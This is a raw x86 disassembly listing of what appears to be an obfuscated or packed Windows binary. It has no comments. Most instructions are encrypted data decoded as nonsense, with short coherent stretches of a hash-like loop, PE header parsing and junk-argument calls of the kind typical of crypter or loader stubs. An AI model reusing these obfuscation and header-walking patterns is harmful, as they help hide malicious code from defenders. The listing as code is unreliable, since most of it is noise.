  4111ff:	jmp    0xc12b:0x8f987865
  411206:	imul   ebx,DWORD PTR [ebp-0x5e],0x1afe4f58
  41120d:	push   es
  41120e:	rcl    BYTE PTR [ebx-0x6f],0x74
  411212:	lahf   
  411213:	fdiv   QWORD PTR [esi+0x6a]
  411216:	daa    
  411217:	mov    edx,0x96f82b48
  41121c:	jle    0x41124a
  41121e:	add    al,0x45
  411220:	leave  
  411221:	in     eax,dx
  411222:	mov    al,0x16
  411224:	pop    ecx
  411225:	adc    ch,bl
  411227:	add    ebp,eax
  411229:	and    eax,0x37a2f24a
  41122e:	icebp  
  41122f:	fs cs mov esp,0xfef1618
  411236:	cmp    ecx,ecx
  411238:	cs cmp eax,0xfae37428
  41123e:	push   es
  41123f:	mov    ecx,0x48875d8
  411244:	sahf   
  411245:	(bad)  
  411246:	stos   BYTE PTR es:[edi],al
  411247:	imul   ebx,ecx,0x538cd7e7
  41124d:	add    eax,0xe7ceed54
  411252:	mov    WORD PTR [esi-0x792be9ca],cs
  411258:	dec    ebp
  411259:	cdq    
  41125a:	jns    0x4112da
  41125c:	out    dx,al
  41125d:	daa    
  41125e:	mov    ds:0xae49f833,eax
  411263:	cmp    edx,eax
  411265:	in     al,0x96
  411267:	ror    BYTE PTR ds:0x4b570964,1
  41126d:	mov    ah,0xae
  41126f:	outs   dx,BYTE PTR ds:[esi]
  411270:	xor    al,0x7
  411272:	dec    edi
  411273:	addr16 jae 0x41128d
  411276:	jmp    0x4112e6
  411278:	sbb    ebx,DWORD PTR [edi+0x25]
  41127b:	mov    edi,DWORD PTR [ecx]
  41127d:	iret   
  41127e:	push   ebp
  41127f:	pusha  
  411280:	mov    es,WORD PTR ss:[edx+0x54c1b620]
  411287:	lds    esp,FWORD PTR [eax+0x5b2ab07e]
  41128d:	xor    BYTE PTR [edx+0x5],0x8e
  411291:	xchg   BYTE PTR [esi+0x7ba82e95],al
  411297:	mov    eax,ds:0x1211d50b
  41129c:	loop   0x411297
  41129e:	leave  
  41129f:	mov    bh,0xd1
  4112a1:	inc    esi
  4112a2:	out    dx,al
  4112a3:	cmp    ah,BYTE PTR [eax-0x76d9e7f7]
  4112a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112aa:	sub    ecx,ebp
  4112ac:	xor    ch,dl
  4112ae:	cmp    BYTE PTR [eax+ecx*4],bl
  4112b1:	lock jnp 0x4112d4
  4112b4:	xor    ebx,DWORD PTR [edi-0x13]
  4112b7:	or     eax,0x8751b822
  4112bc:	std    
  4112bd:	(bad)  
  4112be:	jmp    0x50f05e4c
  4112c3:	mov    WORD PTR gs:[ecx+0x3c],ss
  4112c7:	dec    eax
  4112c8:	jecxz  0x4112f8
  4112ca:	pop    esi
  4112cb:	dec    esp
  4112cc:	mov    edx,0x2747ceaa
  4112d1:	xchg   ebp,eax
  4112d2:	ins    DWORD PTR es:[edi],dx
  4112d3:	mov    ebx,0x124d1102
  4112d8:	cmp    al,0x51
  4112da:	shl    BYTE PTR [eax-0x24d9951f],cl
  4112e0:	push   ebp
  4112e1:	aam    0x6a
  4112e3:	mov    ds:0xf3623a7,eax
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x9068f61e,eax
  411318:	dec    esp
  411319:	pop    sp
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411339
  411324:	push   edx
  411325:	cmp    eax,0xb75de933
  41132a:	aaa    
  41132b:	pop    esi
  41132c:	mov    esi,0x935196d3
  411331:	or     BYTE PTR [esi+0xdae2bd6],bl
  411337:	fidiv  DWORD PTR [ebx]
  411339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41133a:	iret   
  41133b:	cli    
  41133c:	xor    DWORD PTR [ecx-0x34],esp
  41133f:	push   es
  411340:	add    eax,DWORD PTR [edi-0x4309e72e]
  411346:	jecxz  0x411342
  411348:	arpl   WORD PTR [ecx+0x0],ax
  41134b:	xlat   BYTE PTR ds:[ebx]
  41134c:	jae    0x411300
  41134e:	and    cl,cl
  411350:	sar    esi,1
  411352:	inc    ecx
  411353:	xchg   ebp,eax
  411354:	fnstenv [ebx+0x5a]
  411357:	ror    BYTE PTR [esi-0x1d9d511d],cl
  41135d:	repnz out dx,al
  41135f:	add    eax,esi
  411361:	mov    BYTE PTR [esi],dh
  411363:	pop    esi
  411364:	xor    eax,0x13768455
  411369:	mov    edx,0x1aac7fae
  41136e:	gs repnz aad 0x4
  411372:	push   edi
  411373:	mov    dh,0xea
  411375:	fdivr  QWORD PTR [ecx-0x2c]
  411378:	hlt    
  411379:	push   cs
  41137a:	loop   0x4113b8
  41137c:	in     eax,0xaf
  41137e:	fcomp  QWORD PTR [esi+0x68f4522c]
  411384:	loope  0x411367
  411386:	(bad)  
  411387:	jns    0x4113fe
  411389:	ins    DWORD PTR es:[edi],dx
  41138a:	(bad)  
  41138c:	popa   
  41138d:	pop    ebx
  41138e:	sbb    al,BYTE PTR [edi-0x289a5258]
  411394:	fmul   QWORD PTR [esi]
  411396:	outs   dx,DWORD PTR ds:[esi]
  411397:	loope  0x4113c0
  411399:	mov    dh,0x7d
  41139b:	mov    WORD PTR [ecx-0x2928a4d6],fs
  4113a1:	dec    ebp
  4113a2:	into   
  4113a3:	pop    ebx
  4113a4:	mov    ebx,0x5d4d21c8
  4113a9:	imul   esi,DWORD PTR [edx-0x68b29820],0x4dc893f2
  4113b3:	inc    BYTE PTR [ebx-0x2b]
  4113b6:	pop    ebp
  4113b7:	je     0x411433
  4113b9:	pop    ebx
  4113ba:	hlt    
  4113bb:	stos   BYTE PTR es:[edi],al
  4113bc:	in     eax,0xf4
  4113be:	xor    eax,0x3b85c807
  4113c3:	and    eax,0xccad79fc
  4113c8:	fdiv   DWORD PTR [ebp-0x41bb7870]
  4113ce:	jle    0x41137e
  4113d0:	sbb    esi,eax
  4113d2:	jmp    0xf9950f04
  4113d7:	push   0x6c43c393
  4113dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113dd:	mov    ?,WORD PTR [ecx+ebx*4-0x11fe75ed]
  4113e4:	out    0x62,al
  4113e6:	es icebp 
  4113e8:	sub    ch,BYTE PTR [bp+di-0x65]
  4113ec:	push   edi
  4113ed:	sbb    BYTE PTR [edi+0x10],ah
  4113f0:	adc    BYTE PTR [edx+0x5df3768a],dh
  4113f6:	mov    gs,WORD PTR [ecx]
  4113f8:	adc    eax,0x80a59565
  4113fd:	inc    ebx
  4113fe:	fstp   st(0)
  411400:	je     0x41140f
  411402:	mov    BYTE PTR [ecx+0x2],ch
  411405:	push   0xffffffd7
  411407:	imul   eax,DWORD PTR [ebp+eax*8+0x17],0xffffffd0
  41140c:	icebp  
  41140d:	push   ecx
  41140e:	pop    ebp
  41140f:	push   ss
  411410:	mov    ds:0x26956ce,al
  411415:	into   
  411416:	sub    bl,BYTE PTR [eax]
  411418:	rcl    BYTE PTR [eax+0x68],0x20
  41141c:	dec    esi
  41141d:	pop    es
  41141e:	sub    DWORD PTR [esp+ebp*4-0x7c],ebx
  411422:	sub    eax,0xa463a7f
  411427:	jp     0x41142d
  411429:	xchg   esi,eax
  41142a:	sub    eax,0x936e4cce
  41142f:	(bad)  
  411430:	(bad)  
  411431:	shr    DWORD PTR [edx-0x7c],cl
  411434:	or     edi,ecx
  411436:	push   0x25
  411438:	call   0x49ba:0xa1efc6e8
  41143f:	push   esi
  411440:	pop    ds
  411441:	pop    ecx
  411442:	and    eax,0x928a72f3
  411447:	ds or  eax,0x7adb32a6
  41144d:	call   0xfafe:0xeb1e2cd
  411454:	imul   BYTE PTR [edi]
  411456:	sbb    eax,0xadf71c32
  41145b:	sbb    DWORD PTR [esi],esp
  41145d:	aas    
  41145e:	cmp    dh,BYTE PTR ds:0x2c73ea7e
  411464:	js     0x411450
  411466:	das    
  411467:	gs add eax,0xca33cd68
  41146d:	add    edi,DWORD PTR ds:0x7f1766f2
  411473:	lahf   
  411474:	shl    DWORD PTR [edx+edi*1],1
  411477:	sahf   
  411478:	outs   dx,DWORD PTR ds:[esi]
  411479:	or     BYTE PTR [ebp-0x182cfea7],bh
  41147f:	jg     0x4114e8
  411481:	retf   
  411482:	es push ebp
  411484:	adc    BYTE PTR [eax],0x1b
  411487:	int    0x95
  411489:	retf   0x3ed2
  41148c:	xor    ch,BYTE PTR [ecx-0x7f]
  41148f:	rcl    dl,cl
  411491:	iret   
  411492:	or     bh,dh
  411494:	(bad)  
  411496:	cmp    eax,0x148deee4
  41149b:	lahf   
  41149c:	ja     0x411446
  41149e:	adc    edx,edi
  4114a0:	ins    DWORD PTR es:[edi],dx
  4114a1:	pop    DWORD PTR [edx]
  4114a3:	mov    eax,0xe9a0774f
  4114a8:	xor    DWORD PTR [ebx*8+0x21be4d84],edi
  4114af:	fisttp WORD PTR [ebx+0x11410156]
  4114b5:	jb     0x411526
  4114b7:	(bad)  
  4114b8:	mov    edx,0x1375cc32
  4114bd:	mov    ds:0xc7fbe21d,al
  4114c2:	and    bh,cl
  4114c4:	inc    esp
  4114c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114c6:	adc    ecx,DWORD PTR [ebx+ebp*8+0x2bda309b]
  4114cd:	push   ss
  4114ce:	xlat   BYTE PTR ds:[ebx]
  4114cf:	cmp    al,0x65
  4114d1:	mov    ds:0x5c997c15,eax
  4114d6:	fidivr DWORD PTR [ebx+0x49]
  4114d9:	lods   al,BYTE PTR ds:[esi]
  4114da:	inc    esi
  4114db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114dc:	xchg   ebp,eax
  4114dd:	daa    
  4114de:	hlt    
  4114df:	ficom  WORD PTR [edx-0x4fe5f9e4]
  4114e5:	and    ebp,DWORD PTR [ebx+0x12]
  4114e8:	dec    esp
  4114e9:	sub    al,0x9c
  4114eb:	add    al,0x3d
  4114ed:	(bad)  
  4114ee:	xchg   ebx,esp
  4114f0:	jl     0x411499
  4114f2:	repz mov ebx,0x5684d6a2
  4114f8:	loop   0x41153b
  4114fa:	fld    DWORD PTR [ebp+0x47b55566]
  411500:	leave  
  411501:	int    0xed
  411503:	cmc    
  411504:	cdq    
  411505:	jp     0x4114bb
  411507:	add    BYTE PTR [ebp-0x39],bl
  41150a:	ficom  WORD PTR [ebp+0x3e43fce4]
  411510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411511:	aam    0x25
  411513:	gs lahf 
  411515:	jl     0x411512
  411517:	ficom  DWORD PTR [edx-0x22dae545]
  41151d:	(bad)  
  41151f:	(bad)  [edi+0x6f]
  411522:	xchg   ebp,eax
  411523:	inc    esi
  411524:	stos   BYTE PTR es:[edi],al
  411525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411526:	repz ds jge 0x41158f
  41152a:	ja     0x411557
  41152c:	loopne 0x41150a
  41152e:	cmp    BYTE PTR [esi+ecx*2-0x54ecfb59],0x13
  411536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411537:	into   
  411538:	push   esp
  411539:	pop    ds
  41153a:	and    BYTE PTR [esi+ebx*4-0x36],bh
  41153e:	or     ecx,0x7baefcb0
  411544:	push   ss
  411545:	fcmovnbe st,st(6)
  411547:	ins    BYTE PTR es:[edi],dx
  411548:	inc    edx
  411549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41154a:	inc    ebp
  41154b:	mov    bh,0x8b
  41154d:	xor    bh,BYTE PTR [esi+0x7c]
  411550:	xor    DWORD PTR [esi-0x659690da],ecx
  411556:	pop    edi
  411557:	fnstcw WORD PTR [edx-0x249ca771]
  41155d:	mov    edi,0x990438e8
  411562:	test   al,0x42
  411564:	(bad)  
  411565:	daa    
  411566:	xor    dl,BYTE PTR [ebx]
  411568:	jns    0x4115de
  41156a:	mov    eax,ds:0x4f0828bf
  41156f:	test   BYTE PTR [eax+0x68],0x44
  411573:	lock jl 0x41154a
  411576:	test   DWORD PTR [edx],ebx
  411578:	push   edi
  411579:	xchg   edx,eax
  41157a:	jge    0x41152e
  41157c:	sbb    eax,0x7c29fbd3
  411581:	ret    0xf3b7
  411584:	(bad)  
  411586:	lahf   
  411587:	repnz mov WORD PTR [eax+0x34],cs
  41158b:	ret    
  41158c:	xor    BYTE PTR [ecx+0xdb51bc5],al
  411592:	xchg   ecx,eax
  411593:	pop    ds
  411594:	inc    edi
  411595:	mov    edi,0xd4e5a14
  41159a:	popf   
  41159b:	iret   
  41159c:	mov    ds:0xd037978b,eax
  4115a1:	sub    DWORD PTR [esp+eax*4],ebp
  4115a4:	dec    esi
  4115a5:	pop    esi
  4115a6:	xor    BYTE PTR ds:[eax-0x4e],ah
  4115aa:	add    DWORD PTR [edi-0x2],ebp
  4115ad:	test   ah,ah
  4115af:	ret    0x6a92
  4115b2:	mov    esi,es
  4115b4:	mov    ebx,0x1ab7b3b8
  4115b9:	jle    0x4115b7
  4115bb:	inc    ecx
  4115bc:	pop    es
  4115bd:	inc    ebp
  4115be:	jne    0x411555
  4115c0:	push   ebp
  4115c1:	adc    al,0xab
  4115c3:	jae    0x411603
  4115c5:	iret   
  4115c6:	les    esi,FWORD PTR [eax-0x5c]
  4115c9:	out    0xf5,al
  4115cb:	shl    DWORD PTR [edi+0x49f10e5c],0x87
  4115d2:	push   0xffffffcb
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	stc    
  411619:	mov    esi,0x40860307
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x411682
  411625:	sbb    BYTE PTR [ebp-0x423b0a32],ah
  41162b:	outs   dx,DWORD PTR ds:[esi]
  41162c:	loopne 0x411646
  41162e:	jge    0x411607
  411630:	cwde   
  411631:	mov    cl,0x78
  411633:	data16 cmp bl,BYTE PTR [ecx+0x7b8ad180]
  41163a:	aaa    
  41163b:	jp     0x411678
  41163d:	(bad)  
  41163e:	loop   0x4115e7
  411640:	cld    
  411641:	int    0xc7
  411643:	mov    edx,0x7d55ba2b
  411648:	or     ebp,edi
  41164a:	jbe    0x4116c1
  41164c:	add    dh,dl
  41164e:	jmp    DWORD PTR [ebp+0x7a0dca41]
  411654:	mov    eax,DWORD PTR [ebp+0x2df067ee]
  41165a:	imul   ebp,DWORD PTR [ecx+0x1a],0x26452e
  411661:	pop    ds
  411662:	jmp    0x5b049dec
  411667:	add    al,0x18
  411669:	mov    ch,0x1c
  41166b:	aaa    
  41166c:	cwde   
  41166d:	mov    dl,0xac
  41166f:	(bad)  
  411670:	(bad)  
  411672:	js     0x411693
  411674:	dec    esp
  411675:	add    dl,dl
  411677:	adc    al,0x4c
  411679:	push   es
  41167a:	push   ds
  41167b:	cmp    eax,esi
  41167d:	(bad)  
  41167e:	jne    0x4116fc
  411680:	mov    eax,0xd1d5c6d6
  411685:	int3   
  411686:	add    ch,BYTE PTR [esi+0x2e]
  411689:	or     DWORD PTR [edi+0x7f4388fc],ebx
  41168f:	jnp    0x4116f0
  411691:	retf   
  411692:	mov    eax,DWORD PTR [ecx]
  411694:	jmp    0xc9e9:0x2e5dc838
  41169b:	outs   dx,DWORD PTR ds:[esi]
  41169c:	in     eax,0xb7
  41169e:	mov    BYTE PTR [esp+eax*2+0x48],cl
  4116a2:	imul   edi,DWORD PTR [ebp+0x16],0x78462bb9
  4116a9:	xchg   BYTE PTR [ebx+0x173d9c9a],ah
  4116af:	pop    eax
  4116b0:	lods   al,BYTE PTR ds:[esi]
  4116b1:	xchg   BYTE PTR [ecx-0x2f],cl
  4116b4:	xlat   BYTE PTR ds:[ebx]
  4116b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b6:	and    ch,0xd6
  4116b9:	cmp    eax,0x9e42f48b
  4116be:	pop    ecx
  4116bf:	add    al,0x13
  4116c1:	or     al,0xed
  4116c3:	mov    ebp,0xa04953e5
  4116c8:	mov    al,ds:0xee824353
  4116cd:	ror    BYTE PTR [ecx-0x78],0x7c
  4116d1:	xor    dl,ch
  4116d3:	loope  0x411733
  4116d5:	add    DWORD PTR [edi],0x13
  4116d8:	sbb    ecx,esi
  4116da:	js     0x411708
  4116dc:	cdq    
  4116dd:	fcom   DWORD PTR [eax]
  4116df:	mov    bl,0x67
  4116e1:	dec    ebx
  4116e2:	push   0xffffff95
  4116e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e5:	dec    edx
  4116e6:	and    al,0xde
  4116e8:	push   edi
  4116e9:	inc    ecx
  4116ea:	push   ecx
  4116eb:	imul   ecx,ebp,0xeeb3e5bd
  4116f1:	jno    0x4116e4
  4116f3:	hlt    
  4116f4:	int    0xd1
  4116f6:	stos   BYTE PTR es:[edi],al
  4116f7:	cwde   
  4116f8:	jo     0x411738
  4116fa:	(bad)  
  4116fb:	les    edx,FWORD PTR [esi+0x2d]
  4116fe:	fbstp  TBYTE PTR [ebx-0x1ed4e1d]
  411704:	(bad)  
  411707:	aaa    
  411708:	icebp  
  411709:	add    bl,al
  41170b:	repnz mul BYTE PTR [ecx+0x6c]
  41170f:	lods   al,BYTE PTR ds:[esi]
  411710:	or     edi,DWORD PTR [edi+0xb]
  411713:	inc    edx
  411714:	pop    DWORD PTR [ebx+0x69e3884a]
  41171a:	sub    DWORD PTR [ebp+0x2c],eax
  41171d:	xchg   edx,eax
  41171e:	lds    eax,FWORD PTR [esp+edx*1-0x22]
  411722:	dec    ecx
  411723:	(bad)  
  411724:	push   ebp
  411725:	fsub   st,st(4)
  411727:	xor    BYTE PTR ds:0x9a1f057b,al
  41172d:	sbb    edx,DWORD PTR [edi]
  41172f:	cdq    
  411730:	iret   
  411731:	pushf  
  411732:	or     eax,0xb0d9ad7b
  411737:	push   ds
  411738:	cdq    
  411739:	mov    bh,0xe5
  41173b:	clc    
  41173c:	(bad)  [ebp-0x2bf2f9f4]
  411743:	rcr    BYTE PTR [ebp+ebx*8+0x389ff651],0xcd
  41174b:	jl     0x4116f8
  41174d:	add    al,0x78
  41174f:	cmp    esi,DWORD PTR [ecx+0x1d]
  411752:	pop    es
  411753:	cld    
  411754:	add    BYTE PTR [eax+0x59],cl
  411757:	nop
  411758:	xlat   BYTE PTR ds:[ebx]
  411759:	sub    DWORD PTR [edx-0x33],eax
  41175c:	icebp  
  41175d:	fiadd  DWORD PTR [edx-0x56a2b88]
  411763:	mov    esp,0x4aa3da3
  411768:	and    edx,DWORD PTR [ebx-0x30725707]
  41176e:	ja     0x411752
  411770:	(bad)  
  411772:	call   0x6946:0xdf90fbbc
  411779:	mov    bl,BYTE PTR [edx]
  41177b:	in     al,0x8a
  41177d:	cmp    al,0xcd
  41177f:	jl     0x411716
  411781:	pop    ebp
  411782:	ins    DWORD PTR es:[edi],dx
  411783:	scas   eax,DWORD PTR es:[edi]
  411784:	jmp    0xed4ffe7d
  411789:	dec    eax
  41178a:	push   cs
  41178b:	(bad)  
  41178c:	mov    dh,0xe
  41178e:	in     al,0x9a
  411790:	mov    bh,0x24
  411792:	push   0x55
  411794:	jg     0x4117ef
  411796:	xor    al,BYTE PTR [edx+0x2c0dad6d]
  41179c:	add    eax,0xc2f01bb4
  4117a1:	xor    DWORD PTR [ebx-0x75051f84],edi
  4117a7:	mov    ch,BYTE PTR [edi-0x335aa36e]
  4117ad:	adc    DWORD PTR [edx],esi
  4117af:	adc    dl,BYTE PTR [edi-0x748a5687]
  4117b5:	xor    bh,BYTE PTR [edi-0x9]
  4117b8:	pop    ecx
  4117b9:	je     0x411796
  4117bb:	dec    ecx
  4117bc:	addr16 pop eax
  4117be:	scas   eax,DWORD PTR es:[edi]
  4117bf:	add    dh,ah
  4117c1:	push   0xb1cb9a35
  4117c6:	xor    al,0xfc
  4117c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117c9:	add    BYTE PTR [ebx],bl
  4117cb:	inc    esp
  4117cc:	adc    al,0x9a
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x433823,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x43377f,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43381f,0x433783
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43381f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43379b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43382b,0x0
  41182f:	mov    eax,ds:0x43382b
  411834:	inc    eax
  411835:	mov    ds:0x43382b,eax
  41183a:	cmp    DWORD PTR ds:0x43382b,0xb
  411841:	jne    0x411887
  411847:	push   0x43393c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43382b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43382b
  411899:	inc    eax
  41189a:	mov    ds:0x43382b,eax
  41189f:	cmp    DWORD PTR ds:0x43382b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	and    BYTE PTR [ebx],bh
  4118e9:	icebp  
  4118ea:	test   al,0x2c
  4118ec:	dec    esi
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411944
  4118f4:	outs   dx,BYTE PTR ds:[esi]
  4118f5:	cmp    BYTE PTR [esi+0xe3363dc],ch
  4118fb:	xchg   ebp,eax
  4118fc:	loope  0x411940
  4118fe:	mov    esp,0xee36e51
  411903:	mov    dh,0xf7
  411905:	mov    WORD PTR es:[edx-0x6d251170],ds
  41190c:	cmc    
  41190d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41190e:	sub    DWORD PTR [edi-0x7c],edx
  411911:	mov    ds,WORD PTR [esi-0x50]
  411914:	je     0x411930
  411916:	push   ss
  411917:	cmp    ch,BYTE PTR [ebp+0x54]
  41191a:	sub    edi,0xb41851d8
  411920:	mov    WORD PTR ds:0xee7674f8,fs
  411926:	jecxz  0x411920
  411928:	xchg   ecx,eax
  411929:	pop    esp
  41192a:	jae    0x41194f
  41192c:	test   BYTE PTR [ecx+0x4c],al
  41192f:	inc    edi
  411930:	push   eax
  411931:	imul   BYTE PTR [ebx]
  411933:	bound  edi,QWORD PTR [esi+0x4d785953]
  411939:	cmp    eax,0x31de90f
  41193e:	cmp    BYTE PTR [eax-0x6026cabd],ch
  411944:	push   edx
  411945:	xchg   edx,eax
  411946:	and    ebp,ecx
  411948:	jae    0x411994
  41194a:	add    eax,esp
  41194c:	leave  
  41194d:	jbe    0x411900
  41194f:	int    0xa9
  411951:	pminub mm0,mm2
  411954:	ins    BYTE PTR es:[edi],dx
  411955:	adc    BYTE PTR [ecx+0x11],cl
  411958:	or     al,0x52
  41195a:	out    dx,al
  41195b:	rol    DWORD PTR [esi-0x19],0x75
  41195f:	fadd   QWORD PTR [edx+0xcd08bc6]
  411965:	adc    al,0x14
  411967:	dec    esp
  411968:	mov    WORD PTR [edx+0x587739ba],fs
  41196e:	xor    eax,0x18558e6f
  411973:	out    0x47,eax
  411975:	cmc    
  411976:	cmp    eax,0xf95551b7
  41197b:	fidivr WORD PTR [ebx+eax*1]
  41197e:	lods   al,BYTE PTR ds:[esi]
  41197f:	and    eax,0xf80d1a8b
  411984:	sbb    ch,BYTE PTR [eax-0x28a9dd00]
  41198a:	sbb    esi,DWORD PTR [edi]
  41198c:	out    0x22,al
  41198e:	cdq    
  41198f:	mov    ebx,0x37a209a3
  411994:	cmp    cl,cl
  411996:	std    
  411997:	jmp    0xdaa14814
  41199c:	popa   
  41199d:	bound  ecx,QWORD PTR [edx+ecx*4]
  4119a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119a1:	lods   eax,DWORD PTR ds:[esi]
  4119a2:	mov    BYTE PTR [ebx],ah
  4119a4:	scas   eax,DWORD PTR es:[edi]
  4119a5:	bound  edi,QWORD PTR [ecx]
  4119a7:	adc    dh,al
  4119a9:	mov    ecx,0xb9db1185
  4119ae:	es les esp,FWORD PTR es:[edi+0x24b3b457]
  4119b6:	push   ss
  4119b7:	sbb    eax,0x2b5b2a0f
  4119bc:	adc    eax,0xf48f658
  4119c1:	int3   
  4119c2:	icebp  
  4119c3:	inc    ebx
  4119c4:	mov    esp,0x484bae09
  4119c9:	and    eax,0x80d53e4a
  4119ce:	call   0xf873:0x402bb589
  4119d5:	dec    ecx
  4119d6:	inc    edx
  4119d7:	std    
  4119d8:	leave  
  4119d9:	out    dx,al
  4119da:	mov    DWORD PTR [ebx-0x28c85268],edi
  4119e0:	ins    DWORD PTR es:[edi],dx
  4119e1:	sub    DWORD PTR [edx],esp
  4119e3:	fsubr  st(2),st
  4119e5:	imul   edi,DWORD PTR [edx-0x1],0x5a3b0d5d
  4119ec:	dec    ecx
  4119ed:	call   0x880:0x3b10adc9
  4119f4:	aaa    
  4119f5:	shr    DWORD PTR [ecx-0x72],1
  4119f8:	bswap  ebx
  4119fa:	xor    ebp,esp
  4119fc:	sub    BYTE PTR [ebp-0x3a],dl
  4119ff:	int    0xb0
  411a01:	mov    esp,0x9bea26a4
  411a06:	popa   
  411a07:	add    eax,0x5325aac0
  411a0c:	inc    ecx
  411a0d:	fstp   DWORD PTR [ebx-0x57]
  411a10:	dec    esi
  411a11:	test   al,0x10
  411a13:	(bad)  
  411a14:	cmp    al,dh
  411a16:	movd   edx,mm1
  411a19:	icebp  
  411a1a:	into   
  411a1b:	mov    bh,0xc4
  411a1d:	and    ch,BYTE PTR [ebx+0x1c998ce6]
  411a23:	mov    ds:0x5550758d,eax
  411a28:	ins    DWORD PTR es:[edi],dx
  411a29:	mov    bl,0x10
  411a2b:	rcr    DWORD PTR [eax+0x3],cl
  411a2e:	out    0x49,eax
  411a30:	mov    ch,0x12
  411a32:	jno    0x411a9f
  411a34:	dec    esi
  411a35:	xchg   BYTE PTR [ebp+0x7a],bh
  411a38:	or     ah,BYTE PTR [edx-0x45843a87]
  411a3e:	sbb    ebp,edx
  411a40:	(bad)
  411a45:	pusha  
  411a46:	mov    ah,BYTE PTR [edi-0x15]
  411a49:	and    edx,DWORD PTR [eax+0x1afc4529]
  411a4f:	ins    BYTE PTR es:[edi],dx
  411a50:	xor    eax,0x21e6a3e4
  411a55:	cmp    eax,0xbe26bbfb
  411a5a:	addr16 cwde 
  411a5c:	sub    al,0xe
  411a5e:	stos   BYTE PTR es:[edi],al
  411a5f:	ins    BYTE PTR es:[edi],dx
  411a60:	lods   al,BYTE PTR ds:[esi]
  411a61:	xor    dl,BYTE PTR [ebx]
